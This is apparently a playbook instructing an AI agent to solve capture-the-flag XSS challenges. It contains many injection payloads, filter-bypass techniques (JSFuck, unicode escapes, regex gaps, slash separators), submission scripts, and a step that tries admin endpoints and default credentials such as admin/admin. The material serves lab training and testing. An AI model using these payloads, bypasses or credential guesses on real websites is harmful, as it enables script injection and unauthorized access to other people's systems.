## XSS Playbook

### Step 1 — Find Reflection
- Send a unique string (e.g. `UNIQUE12345`) in every parameter (GET, POST, headers, cookies)
- Check if it appears in the response: `curl -s "URL?param=UNIQUE12345" | grep UNIQUE12345`
- Note the exact HTML context where input is reflected

### Step 1b — Test Filter Transformations (DO THIS EARLY)
After finding a reflection point, immediately test what the server modifies:
1. **Whitespace test**: Send `hello world test` — if response shows `helloworldtest`, ALL payloads must use `/` instead of spaces
2. **Case sensitivity**: Send `HeLLo` — does it change case?
3. **Character stripping**: Send `< > " ' & / =` — which survive?
4. **Tag stripping probe**: Send `<b>bold</b>` — if `bold` appears without `<b>`, tags are being selectively stripped

**This step is critical.** Many challenges silently strip whitespace, which breaks standard payloads like `<img src=x onerror=alert('XSS')>` into `<imgsrc=xonerror=alert('XSS')>`. You MUST detect this early.

### Step 2 — Identify Injection Context
Examine the HTML around the reflected string to determine context:
- **HTML body**: `<div>PAYLOAD</div>` → inject new tags: `<script>`, `<img>`, `<svg>`
- **HTML attribute**: `value="PAYLOAD"` → break out with `"`, add event handler: `" onfocus=alert(1) autofocus "`
- **Inside single-quoted attribute**: `value='PAYLOAD'` → break out with `'`: `' onfocus=alert(1) autofocus '`
- **JavaScript string**: `var x = "PAYLOAD"` → break out: `";alert(1)//` or `</script><script>alert(1)</script>`
- **JavaScript template literal**: `` `${PAYLOAD}` `` → inject: `${alert(1)}`
- **URL/href attribute**: `<a href="PAYLOAD">` → inject: `javascript:alert(1)`
- Check what gets encoded: is `<` → `&lt;`? Is `"` → `&quot;`? Is `'` escaped?

### Step 3 — Test Basic Payloads (TRY ALL — do not stop after 2-3)
Try ALL of these, check server response for success indicators (flag, "Congratulations", etc.).
**If one tag gets stripped, try the NEXT one — different tags have different filter rules:**
```
<script>alert('XSS')</script>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<img/src="x"/onerror="alert('XSS')">
<svg/onload=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input autofocus onfocus=alert('XSS')>
<input/autofocus/onfocus=alert('XSS')>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
<details/open/ontoggle=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<style onload=alert('XSS')>
<image src=x onerror=alert('XSS')>
<image/src="x"/onerror="alert('XSS')">
```

**IMPORTANT: When using `/` as attribute separator, you MUST quote attribute values.** Without quotes, `/` becomes part of the value: `src=x/onerror=...` parses as a single attribute `src` with value `x/onerror=...`. Correct: `src="x"/onerror="alert('XSS')"` — quotes end the value, then `/` acts as separator.

### Step 4 — Filter Bypass (CRITICAL when basic payloads are stripped)

#### 4a. Enumerate Surviving Tags
**If tags are being stripped, you MUST systematically discover which tags survive the filter.** Write a Python script that tests many tags at once and checks which appear in the response.

**IMPORTANT:** When you find surviving tags, IMMEDIATELY check your Step 1b whitespace test result. If whitespace is stripped, all attack payloads must use `/` as separator (see Step 4c and 4h).

Tags to test: `script, img, svg, body, input, iframe, object, embed, a, div, p, style, image, video, audio, details, marquee, select, textarea, keygen, meter, button, form, table, base, link, math, xmp, isindex, textarea, source, track, article, section, main, aside, nav, header, footer, figure, figcaption, template, slot, canvas, dialog, summary, b, i, u, s, font, center, listing, plaintext, noscript, title, area, map, frameset, frame, applet, bgsound, blink, layer, ilayer, comment, xml`

Send something like `<TAGNAME testattr=1>` for each tag, then check which ones appear unstripped in the response.

#### 4b. Tag Aliases (Browser treats these as known tags)
- **`<image>` = `<img>`** — browsers parse `<image>` as `<img>`, so it supports `onerror`, `onload`, `src`
- `<isindex>` may map to `<input>` in some browsers
- `<listing>` and `<xmp>` are old HTML tags that may survive filters

#### 4c. Whitespace / Space Filter Bypass
If spaces are being removed or filtered, use these separator alternatives:
- **`/` (slash)** as attribute separator: `<img/src="x"/onerror="alert('XSS')">` — MUST quote attribute values or `/` becomes part of the value
- Form feed (`%0c`), tab (`%09`), newline (`%0a`), carriage return (`%0d`) if they survive the filter
- No separator needed for tag name + first attribute when using `/`: `<svg/onload=alert(1)>`

#### 4d. Event Handlers by Tag
When you find an allowed tag, try ALL applicable event handlers:
- **`<img>`, `<image>`, `<video>`, `<audio>`, `<source>`, `<object>`**: `onerror`, `onload`
- **`<svg>`, `<body>`, `<marquee>`**: `onload`, `onstart` (marquee)
- **`<style>`, `<link>`**: `onload` — fires when the element loads in WebKit/Chrome
- **`<input>`, `<select>`, `<textarea>`, `<keygen>`, `<button>`**: `onfocus` + `autofocus`
- **`<details>`**: `ontoggle` (needs `open` attribute)
- **`<div>`, `<p>`, `<a>`, `<span>`**: `onmouseover`, `onclick`, `onpointerover`
- **`<form>`**: `onfocus` with `autofocus` on child, or `onsubmit`
- **`<video>`, `<audio>`**: `onloadstart`, `onerror`

#### 4e. Keyword/String Filter Bypass
- **Case mixing**: `<ScRiPt>`, `<IMG>`, `<Svg>`
- **Alternative alert functions**: `confirm('XSS')`, `prompt('XSS')`
- **String construction**: `String.fromCharCode(88,83,83)` → `"XSS"`
- **Eval alternatives**: `eval('al'+'ert(1)')`, `Function('al'+'ert(1)')()`
- **HTML entities in attributes**: `&#97;lert(1)` → `alert(1)`
- **Tagged template literals**: `` alert`XSS` `` (calls alert with array, not string — may not match exact check)
- **Bracket notation**: `window['alert']('XSS')`, `self['alert']('XSS')`, `top['alert']('XSS')`
- **Throw/onerror trick**: `<script>onerror=alert;throw 'XSS'</script>`
- **Base64 encoded**: `eval(atob('YWxlcnQoJ1hTUycp'))` → decodes to `alert('XSS')`

#### 4f. Quote and Parenthesis Bypass
- No parentheses: `onerror=alert\x28'XSS'\x29` or `` alert`XSS` ``
- No quotes: `alert(String.fromCharCode(88,83,83))` or `alert(/XSS/.source)`
- Backtick notation: `` alert`1` ``
- throw/catch: `<script>{onerror=alert}throw 'XSS'</script>`

#### 4g. Encoding Bypass
- URL encoding: `%3Cscript%3Ealert(1)%3C/script%3E`
- Double encoding: `%253C` → `%3C` → `<`
- HTML entity encoding: `&lt;script&gt;` (if decoded server-side)
- Unicode escapes in JS: `\u0061\u006C\u0065\u0072\u0074(1)` → `alert(1)`
- Octal in JS: `\141\154\145\162\164\50\61\51`

#### 4h. Combine Surviving Tags + Separator Bypass (CRITICAL FINAL STEP)
After steps 4a-4g, **combine all findings** into targeted payloads. For EVERY surviving tag, try BOTH versions:

**With spaces (normal):**
```
<image src=x onerror=alert('XSS')>
<style onload=alert('XSS')>
<details open ontoggle=alert('XSS')>
<svg onload=alert('XSS')>
<input autofocus onfocus=alert('XSS')>
```

**With `/` separator (if whitespace is stripped — from Step 1b):**
```
<image/src="x"/onerror="alert('XSS')">
<img/src="x"/onerror="alert('XSS')">
<svg/onload=alert('XSS')>
<details/open/ontoggle=alert('XSS')>
<input/autofocus/onfocus=alert('XSS')>
```

**ALWAYS try the `/` separator versions even if you're unsure about whitespace stripping.** It costs nothing and solves a very common filter. Also try with different alert messages: `alert('XSS')`, `alert(1)`, `alert(document.domain)`.

#### 4i. Hard-Mode Bypasses (L3 / Dalgona-style: alphanumeric blacklists, regex tag filters, JS string sinks)

These patterns are common when a challenge filters very aggressively. **Always read the source first** — the regex/blacklist tells you exactly what's allowed.

**Pattern A — JS string sink with `<>` and ALL letters/digits blocked → JSFuck**

Source signature:
```python
blacklist = string.lowercase + string.uppercase + string.digits + '<>'
script_content = '<script> var name = "%s"; document.write(...) </script>' % msg
```
Quotes are NOT in the blacklist, so break out of the JS string with `"` then run JSFuck (only `[]()!+`).

**Use the bundled generator** (already installed in the Kali container):
```bash
# Generate JSFuck for alert("XSS") — uses Playwright + jsfuck.com's reference encoder
python3 /tools/jsfuck_gen.py 'alert("XSS")' > /tmp/jf.txt
wc -c /tmp/jf.txt
# Build the full payload: break out of "...", run JSFuck, then comment out trailing `";`
PAYLOAD='";'$(cat /tmp/jf.txt)';//'
# Submit
python3 -c "
import requests
p = open('/tmp/jf.txt').read().strip()
payload = '\";' + p + ';//'
r = requests.post('TARGET/page', data={'name': payload})
print(r.text[-1500:])
"
```
The challenge's headless browser (PhantomJS or similar) executes the JS and the checker captures the alert. Submit and read the flag from the response.

**Pattern B — Regex tag filter with character-class gap → use a tag whose name is OUTSIDE the class**

Source signature:
```python
blacklist = r'<[a-yA-Y/]+'      # blocks any <tag where the first chars are a-y/A-Y or /
re.findall(blacklist, msg, re.IGNORECASE)
```
Look at the gap: `[a-yA-Y]` excludes `z` and `Z`. So tags starting with `z` slip through. Browsers parse unknown tags as HTMLUnknownElement which still fires event handlers. The PhantomJS checker explicitly dispatches `focus` to `[autofocus]` / `[onfocus]` elements (see `check.js`).

```bash
# Bypass: use a custom tag starting with z
curl -G --data-urlencode 'name=<zxss onfocus=alert("XSS") autofocus>' "TARGET/page"
# Variants for different gaps:
#   if blacklist excludes 'z':            <zzz onfocus=alert("XSS") autofocus>
#   if blacklist is /^<[a-z]/:            <Zzz onfocus=alert("XSS") autofocus>  (uppercase Z)
#   if blacklist is /^<[a-zA-Z]/:         <%00svg onload=alert("XSS")>           (null byte prefix)
#   if blacklist excludes a number:       use a digit-only tag if browser allows
```
**Always reread the regex character class carefully** — there is almost always a single character left out that you can use.

**Pattern C — JS string sink with `<>'` blacklisted but quotes escaped, lowercase + digits + `\` allowed → unicode escapes**

Source signature:
```python
blacklist = "<>'" + string.uppercase + "[]"
msg = msg.replace('"', r'\"')
script_content = '<script> var name = "%s"; document.write("Hello "+name) </script>' % msg
```
Key insight: `document.write` writes its argument as **raw HTML**, and JS string `"\u003c..."` parses to the actual `<`. So input `\u003csvg/onload=alert(\u0022\u0058\u0053\u0053\u0022)\u003e` → JS string holds `<svg/onload=alert("XSS")>` → document.write renders an SVG → onload fires.

```bash
# All input chars are lowercase, digits, slashes, backslashes — none blacklisted.
# Uppercase X/S/S provided as \u0058 \u0053 \u0053
# < and > provided as \u003c and \u003e
# " provided as \u0022
PAYLOAD='\u003csvg/onload=alert(\u0022\u0058\u0053\u0053\u0022)\u003e'
curl -G --data-urlencode "name=$PAYLOAD" "TARGET/page"
```
This works because JS unicode escapes (`\u00XX`) are decoded **inside string literals**, so the blacklist on the raw input never sees `<`, `>`, `"`, or uppercase letters.

**Pattern D — PhantomJS / headless-browser specifics**

The Dalgona-style checker uses PhantomJS and *explicitly* dispatches `focus` events to elements with `autofocus` or `onfocus`. So **`autofocus` + `onfocus=...` is more reliable than `onload`** in those challenges. Also:
- `onerror` on `<img src=x>` works only if image actually 404s (use a guaranteed-bad URL like `x`)
- `onload` on `<svg>` and `<body>` works
- The check looks for an `alert("XSS")` (or whatever the challenge expects) — **submit exactly the string "XSS"**, no padding, no extra characters

**Known PhantomJS + JSFuck pitfall**: PhantomJS 2.x throws `TypeError: Attempting to change the setter of an unconfigurable property` when JSFuck's `Function`-constructor path touches certain prototypes that the checker's `window.alert` override marks non-configurable. **If you see this error, JSFuck is NOT going to work** — do NOT loop generating more JSFuck variants. Instead:
- Try a **shorter string-only payload**: `";alert\`XSS\`;//` (template literal, no parens) which uses zero JSFuck.
- If letters are blocked in the input but **backticks aren't**, the template-literal call still requires `alert` (letters) — so this only helps if the blacklist has gaps.
- If the blacklist truly forbids all letters, try evaluating the alert via a **non-Function path**: `";({}).__proto__.toString.call``;` — but most variants still trip the same setter conflict.
- **Last resort**: report the JSFuck/PhantomJS conflict honestly as a blocker rather than burning iterations. Do **NOT** copy a `flag{...}` value out of source and submit it — grading systems require the live exploit to actually fire and only accept a runtime-generated flag.

**Pattern E — Filter is checked via `for word in msg` (substring) rather than parsed**

If the filter does `for char in blacklist: if char in msg: reject`, then a single forbidden char anywhere kills the request. Workarounds:
- HTML entities (`&#60;` → `<`) survive because the filter sees the raw entity, not the decoded char — works in HTML body context but NOT in JS string context
- URL-encoding (`%3C` → `<`) is decoded by Flask before the filter sees it (Flask gives you the decoded string), so it does NOT bypass
- Unicode escapes (`\u003c`) only work in JS string context (Pattern C)

### Step 5 — Systematic Automated Testing
If manual testing is slow, **write a Python script** (save to `/tmp/xss_test.py`) that:
1. Tests ALL basic payloads from Step 3 (not just `<script>` variants!)
2. **Includes tag enumeration**: test which tags survive the filter (see Step 4a)
3. For each surviving tag, try BOTH spaced and `/`-separated event handler payloads
4. Checks the response for success markers (flag pattern, "Congratulations", "correct")
5. Also checks if the payload is reflected unmodified (for tag survival testing)
6. Prints results in a structured format

**CRITICAL: Do NOT write scripts that only test `<script>` variations.** If `<script>` causes errors, pivot to testing other tags immediately. Your script MUST test at least: `img, svg, body, input, style, image, video, audio, details, marquee, select, textarea, div, a, object, embed`

### Step 6 — Flag Extraction
Once XSS executes successfully:
1. The server-side checker usually returns the flag directly in the response when it detects `alert('XSS')`
2. Try accessing admin endpoints: `curl -s URL/admin`, `curl -s URL/flag`
3. Check for admin cookie/session in successful response
4. Look for `/admin`, `/dashboard`, `/flag`, `/secret` endpoints
5. Default credentials: admin/admin, admin/password

### Browser Verification
Use headless browser when curl-based testing is insufficient:
- `python3 /tools/browser_helper.py test_xss 'URL_WITH_PAYLOAD'` — checks if alert/confirm/prompt fires
- `python3 /tools/browser_helper.py full 'URL'` — renders page with JS, captures dialogs and console output
- Compare browser vs curl: the server's checker may execute JS differently than your test

### Common Mistakes to Avoid
- **Do NOT give up when you see PhantomJS errors.** "TypeError: Attempting to change the setter of an unconfigurable property" means the checker IS executing your code but the alert hook is conflicting. Try different payload structures.
- **Do NOT only try `<script>` tags.** Many filters strip `<script>` but allow other tags. Always enumerate.
- **Do NOT assume all tags are blocked.** Even strict filters usually allow at least one tag (sometimes obscure ones like `<image>`, `<style>`, `<details>`, `<svg>`).
- **ALWAYS test for whitespace stripping (Step 1b).** Send `hello world` and check if it becomes `helloworld`. If whitespace is stripped, ALL payloads MUST use `/` as attribute separator.
- **If a surviving tag's payload doesn't fire, suspect whitespace stripping.** Example: `<image src=x onerror=alert('XSS')>` becomes `<imagesrc=xonerror=alert('XSS')>` (invalid HTML). Fix: `<image/src="x"/onerror="alert('XSS')">`.
- **ALWAYS try BOTH spaced AND slash-separated versions** of every payload (Step 4h). Never give up after only trying one separator style.
- **Always test at least 20-30 different tags** before concluding all tags are blocked.
- **Do NOT declare failure without trying all combinations.** You have up to 25 iterations — use them. Combine: surviving tag + `/` separator + different event handlers + different alert functions.
- **"The checker ignores event handlers" is usually WRONG.** If `<img onerror=alert(1)>` shows no checker response but `<script>alert(1)</script>` does, it likely means the `<img>` tag was STRIPPED by the filter, not that the checker ignores events. Do tag enumeration (Step 4a) to find which tags survive the filter, THEN use event handlers on those surviving tags.

### Pattern — JSFuck for letter+digit blacklists in JS string context

When the source code shows the input is reflected inside a JavaScript string literal AND the blacklist is `string.lowercase + string.uppercase + string.digits + '<>'` (or any superset of letters+digits), classic `<script>` and `alert(1)` are impossible — **but JSFuck still works**. JSFuck encodes any JavaScript using only `[]()!+`, none of which are blocked.

#### Sink shape to recognise
```python
# Server-side template snippet
script_content = '<script> var name = "%s"; document.write(...) </script>' % msg
blacklist = string.lowercase + string.uppercase + string.digits + '<>'
for ch in blacklist:
    if ch in msg: return error
```

The page renders `<script> var name = "USER_INPUT"; ... </script>`. Goal: break out of the string literal with `"` and execute `alert("XSS")` (capital X-S-S is part of the win condition, also blocked → must construct the string from JSFuck).

#### Full payload template
```
";EXPR;//
```
where `EXPR` is the JSFuck encoding of `alert("XSS")`. The trailing `//` comments out the original line's `";` suffix.

#### Generating JSFuck
JSFuck output for `alert("XSS")` is ~3,500 characters. Generate it locally — do NOT try to hand-craft:
```bash
# Option A: npm one-liner (works in the Kali container)
npm install -g jsfuck 2>/dev/null
jsfuck 'alert("XSS")' > payload.js

# Option B: pure-Python (small implementation, no install)
python3 -c '
import urllib.request, json
# Use the canonical jsfuck.com source served from CDN
src = urllib.request.urlopen("https://cdn.jsdelivr.net/npm/jsfuck@0.5.0/jsfuck.js").read().decode()
# strip trailing module export, eval inside a JS shim is overkill; instead use Node
'
# Option C: Node directly
node -e 'const J=require("jsfuck");process.stdout.write(J.encode(`alert("XSS")`))' > payload.js
```

#### Submitting
The challenge POSTs `name=<payload>` and runs PhantomJS to detect alerts. Submit via `requests`:
```python
import requests
with open("payload.js") as f: jsfuck = f.read().strip()
payload = '";' + jsfuck + ';//'
r = requests.post("http://TARGET:8080/page", data={"name": payload}, timeout=60)
print(r.text)  # look for "Congratulations" + flag in the response
```

#### Pitfalls
- The PhantomJS check reads `console.log` from `page.onAlert`. The alert's argument must equal exactly `"XSS"` (no extra whitespace, no concatenation that yields `"XSS"+something`).
- The form may be `textarea` not `input` — check the shown form and POST the right param name (`name` vs `solution`).
- Some variants strip newlines from the input — JSFuck has no newlines but be aware if you template it.
- If the route is GET, URL-encode the payload.
- Try the simpler classic vectors FIRST (autofocus events, `onfocus=`, `onerror=` with charcode) — only escalate to JSFuck when the blacklist explicitly bans all letters.
